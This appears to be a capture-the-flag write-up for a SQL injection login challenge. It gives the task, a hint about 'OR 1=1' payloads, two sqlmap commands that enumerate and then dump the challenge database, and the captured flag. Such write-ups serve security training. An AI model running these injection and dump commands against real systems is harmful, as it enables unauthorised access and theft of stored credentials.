# Web

## SQL Injection Login

Please open [this site](http://178.128.112.149/9_medium)

You are given access to a system with a login mechanism. It is known that this system is vulnerable to SQL Injection attacks. Your task is to get the password from the admin account stored in the database. How can you do this? And you are only given user account access.

username: user
pass: linux123

Hint: Note that in SQL, an expression like 'OR 1=1' will always evaluate to true. Can you create a payload and insert it into the username input to exploit this vulnerability?

---

### Solution

`$ sqlmap -u "http://178.128.112.149/9_medium/login.php" --dbms="MySQL" --data="username=admin&password=linux123" --dbs`

```
available databases [3]:
[*] db_9_medium
[*] information_schema
[*] performance_schema
```

`$ sqlmap -u "http://178.128.112.149/9_medium/login.php" --dbms="MySQL" --data="username=admin&password=linux123" -D db_9_medium --dump-all --batch`

![DUMP](https://media.discordapp.net/attachments/758115188796162088/1152450340361351198/image.png?width=1920&height=300)


>BPJS{bc5fa5f8e281d432da8af5adec8a13bb}